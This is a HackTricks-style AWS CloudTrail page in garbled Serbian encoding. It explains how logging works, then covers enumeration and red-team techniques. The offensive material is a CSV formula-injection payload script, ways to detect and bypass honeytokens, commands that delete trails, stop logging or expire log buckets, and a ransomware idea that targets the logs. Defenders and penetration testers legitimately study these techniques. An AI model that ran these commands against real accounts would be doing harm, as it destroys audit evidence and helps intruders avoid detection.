# AWS - CloudTrail Enum

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite **vaÅ¡u kompaniju reklamiranu u HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## **CloudTrail**

AWS CloudTrail **beleÅ¾i i prati aktivnosti unutar vaÅ¡eg AWS okruÅ¾enja**. On snima detaljne **dnevniÄke zapise dogaÄ‘aja**, ukljuÄujuÄ‡i ko je Å¡ta uradio, kada i odakle, za sve interakcije sa AWS resursima. Ovo pruÅ¾a evidenciju promena i akcija, pomaÅ¾e u analizi bezbednosti, reviziji usaglaÅ¡enosti i praÄ‡enju promena resursa. CloudTrail je neophodan za razumevanje ponaÅ¡anja korisnika i resursa, poboljÅ¡anje bezbednosti i obezbeÄ‘ivanje usaglaÅ¡enosti sa propisima.

Svaki zabeleÅ¾eni dogaÄ‘aj sadrÅ¾i:

* Naziv pozvane API metode: `eventName`
* Pozvani servis: `eventSource`
* Vreme: `eventTime`
* IP adresa: `SourceIPAddress`
* Metoda agenta: `userAgent`. Primeri:
* Signing.amazonaws.com - Iz AWS Management Console
* console.amazonaws.com - Root korisnik naloga
* lambda.amazonaws.com - AWS Lambda
* Parametri zahteva: `requestParameters`
* Elementi odgovora: `responseElements`

DogaÄ‘aji se upisuju u novu datoteku dnevnika **pribliÅ¾no svakih 5 minuta u JSON formatu**, Äuvaju se u CloudTrail-u i na kraju se **isporuÄuju u S3 pribliÅ¾no 15 minuta kasnije**.\
CloudTrail dnevnici mogu se **agregirati preko naloga i preko regiona**.\
CloudTrail omoguÄ‡ava koriÅ¡Ä‡enje **celovitosti dnevnika kako biste mogli da proverite da li su vaÅ¡e dnevniÄke datoteke ostale nepromenjene** od trenutka kada ih je CloudTrail isporuÄio. On kreira SHA-256 heÅ¡ dnevnika unutar datoteke sa saÅ¾etkom. SHA-256 heÅ¡ novih dnevnika se kreira svaki sat.\
Prilikom kreiranja Trail-a, selektori dogaÄ‘aja Ä‡e vam omoguÄ‡iti da naznaÄite Trail za beleÅ¾enje: upravljaÄke, podatkovne ili uvide dogaÄ‘aje.

Dnevnici se Äuvaju u S3 kanti. Podrazumevano se koristi enkripcija sa serverne strane (SSE-S3), tako da Ä‡e AWS deÅ¡ifrovati sadrÅ¾aj za osobe koje imaju pristup, ali radi dodatne bezbednosti moÅ¾ete koristiti SSE sa KMS i svoje kljuÄeve.

Dnevnici se Äuvaju u **S3 kanti sa ovim formatom imena**:

* **`BucketName/AWSLogs/AccountID/CloudTrail/RegionName/YYY/MM/DD`**
* Gde je BucketName: **`aws-cloudtrail-logs-<accountid>-<random>`**
* Primer: **`aws-cloudtrail-logs-947247140022-ffb95fe7/AWSLogs/947247140022/CloudTrail/ap-south-1/2023/02/22/`**

Unutar svake fascikle, svaki dnevnik Ä‡e imati **ime koje prati ovaj format**: **`AccountID_CloudTrail_RegionName_YYYYMMDDTHHMMZ_Random.json.gz`**

Konvencija za imenovanje dnevnika

![](<../../../../.gitbook/assets/image (29).png>)

Osim toga, **datoteke saÅ¾etka (za proveru celovitosti datoteka)** Ä‡e biti unutar **iste kante** u:

![](<../../../../.gitbook/assets/image (22).png>)

### Agregiranje dnevnika iz viÅ¡e naloga

* Kreirajte Trial u AWS nalogu gde Å¾elite da se isporuÄe dnevniÄke datoteke
* Dodelite dozvole za odrediÅ¡nu S3 kantu koja omoguÄ‡ava pristup izmeÄ‘u naloga za CloudTrail i dozvolite svakom AWS nalogu koji treba pristup
* Kreirajte novi Trail u drugim AWS nalozima i odaberite da koristite kreiranu kantu u koraku 1

MeÄ‘utim, Äak i ako moÅ¾ete saÄuvati sve dnevnike u istoj S3 kanti, ne moÅ¾ete agregirati CloudTrail dnevnike iz viÅ¡e naloga u CloudWatch dnevnike koji pripadaju jednom AWS nalogu.

{% hint style="danger" %}
Zapamtite da jedan nalog moÅ¾e imati **razliÄite Trail-ove** iz CloudTrail-a **omoguÄ‡ene** koji Äuvaju iste (ili razliÄite) dnevnike u razliÄitim kantama.
{% endhint %}

### Cloudtrail iz svih org naloga u jedan

Prilikom kreiranja CloudTrail-a, moguÄ‡e je naznaÄiti da se aktivira cloudtrail za sve naloge u organizaciji i da se dnevnici dobiju u samo jednoj kanti:

<figure><img src="../../../../.gitbook/assets/image (1) (1) (5).png" alt=""><figcaption></figcaption></figure>

Na ovaj naÄin moÅ¾ete lako konfigurisati CloudTrail u svim regionima svih naloga i centralizovati dnevnike u 1 nalogu (koji treba da zaÅ¡titite).

### Provera datoteka dnevnika

MoÅ¾ete proveriti da li su dnevnici izmenjeni pokretanjem

{% code overflow="wrap" %}
```javascript
aws cloudtrail validate-logs --trail-arn <trailARN> --start-time <start-time> [--end-time <end-time>] [--s3-bucket <bucket-name>] [--s3-prefix <prefix>] [--verbose]
```
{% endcode %}

### Dnevnici u CloudWatch-u

**CloudTrail moÅ¾e automatski slati dnevnike u CloudWatch tako da moÅ¾ete postaviti upozorenja koja Ä‡e vas obavestiti kada se izvrÅ¡e sumnjive aktivnosti.**\
Imajte na umu da je potrebno kreirati **ulogu** koja omoguÄ‡ava CloudTrail-u da Å¡alje dnevnike u CloudWatch. Ako je moguÄ‡e, preporuÄuje se koriÅ¡Ä‡enje AWS podrazumevane uloge za izvrÅ¡avanje ovih radnji. Ova uloga Ä‡e omoguÄ‡iti CloudTrail-u da:

* CreateLogStream: Ovo omoguÄ‡ava kreiranje CloudWatch Logs log stream-ova
* PutLogEvents: Dostavlja CloudTrail dnevnike u CloudWatch Logs log stream-ove

### Istorija dogaÄ‘aja

CloudTrail Event History vam omoguÄ‡ava da pregledate u tabeli zabeleÅ¾ene dnevnike:

![](<../../../../.gitbook/assets/image (24).png>)

### Uvidi

**CloudTrail Insights** automatski **analizira** upravljaÄke dogaÄ‘aje pisanja iz CloudTrail staza i **upozorava** na **neobiÄne aktivnosti**. Na primer, ako postoji poveÄ‡anje dogaÄ‘aja `TerminateInstance` koje se razlikuje od uspostavljenih osnova, videÄ‡ete ga kao Insight dogaÄ‘aj. Ovi dogaÄ‘aji olakÅ¡avaju **pronalaÅ¾enje i reagovanje na neobiÄnu API aktivnost** viÅ¡e nego ikad.

Uvidi se Äuvaju u istom spremiÅ¡tu kao i CloudTrail dnevnici u: `BucketName/AWSLogs/AccountID/CloudTrail-Insight`

### Bezbednost

| Integritet datoteka CloudTrail dnevnika | <ul><li>Proverava da li su dnevnici izmenjeni (izmenjeni ili obrisani)</li><li><p>Koristi digest datoteke (kreira heÅ¡ za svaku datoteku)</p><ul><li>SHA-256 heÅ¡iranje</li><li>SHA-256 sa RSA za digitalno potpisivanje</li><li>privatni kljuÄ u vlasniÅ¡tvu Amazona</li></ul></li><li>Kreiranje digest datoteke traje 1 sat (izvrÅ¡ava se svaki sat)</li></ul> |
| ------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| Zaustavite neovlaÅ¡Ä‡en pristup         | <ul><li><p>Koristite IAM politike i S3 politike spremiÅ¡ta</p><ul><li>tim za bezbednost â€”> administratorski pristup</li><li>revizori â€”> samo Äitanje pristupa</li></ul></li><li>Koristite SSE-S3/SSE-KMS za enkripciju dnevnika</li></ul>                                                                                                                                        |
| SprjeÄavanje brisanja datoteka dnevnika | <ul><li>OgraniÄite pristup brisanju pomoÄ‡u IAM i politika spremiÅ¡ta</li><li>KonfiguriÅ¡ite S3 MFA brisanje</li><li>Proverite sa Log File Validation</li></ul>                                                                                                                                                                                            |

## Access Advisor

AWS Access Advisor se oslanja na poslednjih 400 dana AWS **CloudTrail dnevnika da bi prikupio svoje uvide**. CloudTrail beleÅ¾i istoriju AWS API poziva i povezanih dogaÄ‘aja napravljenih u AWS nalogu. Access Advisor koristi ove podatke da bi **prikazao kada su usluge poslednji put koriÅ¡Ä‡ene**. AnalizirajuÄ‡i CloudTrail dnevnike, Access Advisor moÅ¾e utvrditi koje AWS usluge je IAM korisnik ili uloga koristila i kada se ta pristup dogodio. Ovo pomaÅ¾e AWS administratorima da donose informisane odluke o **usavrÅ¡avanju dozvola**, jer mogu identifikovati usluge koje nisu koriÅ¡Ä‡ene u duÅ¾em vremenskom periodu i potencijalno smanjiti preÅ¡iroke dozvole na osnovu stvarnih Å¡ablona koriÅ¡Ä‡enja.

{% hint style="success" %}
Stoga, Access Advisor obaveÅ¡tava o **nepotrebnim dozvolama koje se daju korisnicima**, tako da administrator moÅ¾e da ih ukloni.
{% endhint %}

<figure><img src="../../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Radnje

### Nabrojavanje
```bash
# Get trails info
aws cloudtrail list-trails
aws cloudtrail describe-trails
aws cloudtrail list-public-keys
aws cloudtrail get-event-selectors --trail-name <trail_name>
aws [--region us-east-1] cloudtrail get-trail-status --name [default]

# Get insights
aws cloudtrail get-insight-selectors --trail-name <trail_name>

# Get data store info
aws cloudtrail list-event-data-stores
aws cloudtrail list-queries --event-data-store <data-source>
aws cloudtrail get-query-results --event-data-store <data-source> --query-id <id>
```
### **CSV Injection**

MoguÄ‡e je izvrÅ¡iti CSV ubacivanje unutar CloudTrail-a koje Ä‡e izvrÅ¡iti proizvoljni kod ako se zapisi izvezu u CSV formatu i otvore u programu Excel.\
SledeÄ‡i kod Ä‡e generisati unos zapisa sa loÅ¡im imenom Trail-a koje sadrÅ¾i payload:
```python
import boto3
payload = "=cmd|'/C calc'|''"
client = boto3.client('cloudtrail')
response = client.create_trail(
Name=payload,
S3BucketName="random"
)
print(response)
```
Za viÅ¡e informacija o CSV ubacivanju proverite stranicu:

{% embed url="https://book.hacktricks.xyz/pentesting-web/formula-injection" %}

Za viÅ¡e informacija o ovoj specifiÄnoj tehnici proverite [https://rhinosecuritylabs.com/aws/cloud-security-csv-injection-aws-cloudtrail/](https://rhinosecuritylabs.com/aws/cloud-security-csv-injection-aws-cloudtrail/)

## **Bypass Detekcije**

### HoneyTokens **bypass**

HoneyTokens su kreirani da **detektuju izvlaÄenje osetljivih informacija**. U sluÄaju AWS-a, to su **AWS kljuÄevi Äije se koriÅ¡Ä‡enje prati**, ako neÅ¡to pokrene akciju sa tim kljuÄem, onda neko mora da je ukrao taj kljuÄ.

MeÄ‘utim, ova praÄ‡enja se vrÅ¡e putem **CloudTrail**-a, i postoje neke **AWS usluge koje ne Å¡alju logove CloudTrail-u** (pronaÄ‘ite [ovde](https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-unsupported-aws-services.html) listu). Neke od tih usluga Ä‡e **odgovoriti** sa **greÅ¡kom** koja sadrÅ¾i **ARN uloge kljuÄa** ako neovlaÅ¡Ä‡ena osoba (honeytoken kljuÄ) pokuÅ¡a da mu pristupi.

Na ovaj naÄin, **napadaÄ moÅ¾e dobiti ARN kljuÄa bez pokretanja bilo kakvog loga**. U ARN-u napadaÄ moÅ¾e videti **AWS ID i ime naloga**, lako je znati ID i imena HoneyToken kompanija, tako da napadaÄ moÅ¾e identifikovati da li je token HoneyToken.

![](<../../../../.gitbook/assets/image (65).png>)

#### **Detekcija HoneyTokena**

[**Pacu**](https://github.com/RhinoSecurityLabs/pacu/blob/79cd7d58f7bff5693c6ae73b30a8455df6136cca/pacu/modules/iam\_\_detect\_honeytokens/main.py#L57) detektuje da li kljuÄ pripada [**Canarytokens**](https://canarytokens.org/generate)**,** [**SpaceCrab**](https://bitbucket.org/asecurityteam/spacecrab/issues?status=new\&status=open)**,** [**SpaceSiren**](https://github.com/spacesiren/spacesiren)**:**

* Ako se **`canarytokens.org`** pojavi u imenu uloge ili ID naloga **`534261010715`** se pojavi u poruci o greÅ¡ci.
* TestirajuÄ‡i ih nedavno, koriste nalog **`717712589309`** i joÅ¡ uvek ima string **`canarytokens.com`** u imenu.
* Ako se **`SpaceCrab`** pojavi u imenu uloge u poruci o greÅ¡ci.
* **SpaceSiren** koristi **uuids** za generisanje korisniÄkih imena: `[a-f0-9]{8}-[a-f0-9]{4}-4[a-f0-9]{3}-[89aAbB][a-f0-9]{3}-[a-f0-9]{12}`
* Ako **ime izgleda kao sluÄajno generisano**, postoji visoka verovatnoÄ‡a da je to HoneyToken.

{% hint style="danger" %}
Imajte na umu da su sve javne API-je otkrivene kao one koje ne stvaraju CloudTrail logove sada ispravljene, tako da moÅ¾da morate pronaÄ‡i svoje...

Ili moÅ¾ete dobiti **Account ID** iz **enkodiranog** unutar **pristupnog kljuÄa** kao Å¡to je [**objaÅ¡njeno ovde**](https://medium.com/@TalBeerySec/a-short-note-on-aws-key-id-f88cc4317489) i proveriti Account ID sa svojom listom Honeytokens AWS naloga:
```python
import base64
import binascii

def AWSAccount_from_AWSKeyID(AWSKeyID):

trimmed_AWSKeyID = AWSKeyID[4:] #remove KeyID prefix
x = base64.b32decode(trimmed_AWSKeyID) #base32 decode
y = x[0:6]

z = int.from_bytes(y, byteorder='big', signed=False)
mask = int.from_bytes(binascii.unhexlify(b'7fffffffff80'), byteorder='big', signed=False)

e = (z & mask)>>7
return (e)

print ("account id:" + "{:012d}".format(AWSAccount_from_AWSKeyID("ASIAQNZGKIQY56JQ7WML")))
```
{% endhint %}

Za viÅ¡e informacija pogledajte [**originalno istraÅ¾ivanje**](https://rhinosecuritylabs.com/aws/aws-iam-enumeration-2-0-bypassing-cloudtrail-logging/).

### Pristupanje treÄ‡oj infrastrukturi

OdreÄ‘ene AWS usluge Ä‡e **stvoriti infrastrukturu** kao Å¡to su **baze podataka** ili **Kubernetes** klasteri (EKS). Korisnik koji **direktno komunicira sa tim uslugama** (kao Å¡to je Kubernetes API) **neÄ‡e koristiti AWS API**, pa CloudTrail neÄ‡e moÄ‡i da vidi ovu komunikaciju.

Stoga, korisnik koji ima pristup EKS-u i koji je otkrio URL EKS API-ja moÅ¾e generisati token lokalno i **komunicirati direktno sa API uslugom bez otkrivanja od strane CloudTrail-a**.

ViÅ¡e informacija u:

{% content-ref url="../../aws-post-exploitation/aws-eks-post-exploitation.md" %}
[aws-eks-post-exploitation.md](../../aws-post-exploitation/aws-eks-post-exploitation.md)
{% endcontent-ref %}

### Modifikacija CloudTrail konfiguracije

#### Brisanje tragova
```bash
aws cloudtrail delete-trail --name [trail-name]
```
#### Zaustavite staze

Da biste zaustavili stazu, koristite sledeÄ‡u komandu:

```plaintext
aws cloudtrail stop-logging --name <ime-staze>
```

Gde `<ime-staze>` predstavlja ime staze koju Å¾elite da zaustavite.
```bash
aws cloudtrail stop-logging --name [trail-name]
```
#### OnemoguÄ‡i viÅ¡eregionalno beleÅ¾enje

{% code overflow="wrap" %}
```bash
aws cloudtrail update-trail --name [trail-name] --no-is-multi-region --no-include-global-services
```
#### OnemoguÄ‡i beleÅ¾enje pomoÄ‡u selektora dogaÄ‘aja

{% code overflow="wrap" %}
```bash
# Leave only the ReadOnly selector
aws cloudtrail put-event-selectors --trail-name <trail_name> --event-selectors '[{"ReadWriteType": "ReadOnly"}]' --region <region>

# Remove all selectors (stop Insights)
aws cloudtrail put-event-selectors --trail-name <trail_name> --event-selectors '[]' --region <region>
```
{% endcode %}

U prvom primeru, jedan selektor dogaÄ‘aja je dat kao JSON niz sa jednim objektom. `"ReadWriteType": "ReadOnly"` ukazuje da selektor dogaÄ‘aja treba da zabeleÅ¾i samo dogaÄ‘aje samo za Äitanje (tako da CloudTrail insights neÄ‡e proveravati dogaÄ‘aje za pisanje, na primer).

MoÅ¾ete prilagoditi selektor dogaÄ‘aja prema svojim specifiÄnim zahtevima.

#### Brisanje zapisa putem S3 lifecycle politike

{% code overflow="wrap" %}
```bash
aws s3api put-bucket-lifecycle --bucket <bucket_name> --lifecycle-configuration '{"Rules": [{"Status": "Enabled", "Prefix": "", "Expiration": {"Days": 7}}]}' --region <region>
```
{% endcode %}

### Modifikacija konfiguracije kante

* ObriÅ¡i S3 kantu
* Promeni politiku kante da odbija svaki upis iz CloudTrail servisa
* Dodaj lifecycle politiku na S3 kantu da obriÅ¡e objekte
* OnemoguÄ‡i KMS kljuÄ koji se koristi za enkripciju CloudTrail logova

### Cloudtrail ransomware

#### S3 ransomware

MoÅ¾ete **generisati asimetriÄni kljuÄ** i **CloudTrail enkriptovati podatke** sa tim kljuÄem i **obrisati privatni kljuÄ** tako da CloudTrail sadrÅ¾aj ne moÅ¾e biti povraÄ‡en.\
Ovo je u osnovi **S3-KMS ransomware** objaÅ¡njen u:

{% content-ref url="../../../aws-pentesting/aws-post-exploitation/aws-s3-post-exploitation.md" %}
[aws-s3-post-exploitation.md](../../../aws-pentesting/aws-post-exploitation/aws-s3-post-exploitation.md)
{% endcontent-ref %}

**KMS ransomware**

Ovo je najlakÅ¡i naÄin da se izvede prethodni napad sa razliÄitim zahtevima dozvola:

{% content-ref url="../../../aws-pentesting/aws-post-exploitation/aws-kms-post-exploitation.md" %}
[aws-kms-post-exploitation.md](../../../aws-pentesting/aws-post-exploitation/aws-kms-post-exploitation.md)
{% endcontent-ref %}

## **Reference**

* [https://cloudsecdocs.com/aws/services/logging/cloudtrail/#inventory](https://cloudsecdocs.com/aws/services/logging/cloudtrail/#inventory)

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini da podrÅ¾ite HackTricks:

* Ako Å¾elite da vidite **vaÅ¡u kompaniju reklamiranu u HackTricks-u** ili **preuzmete HackTricks u PDF formatu** Proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
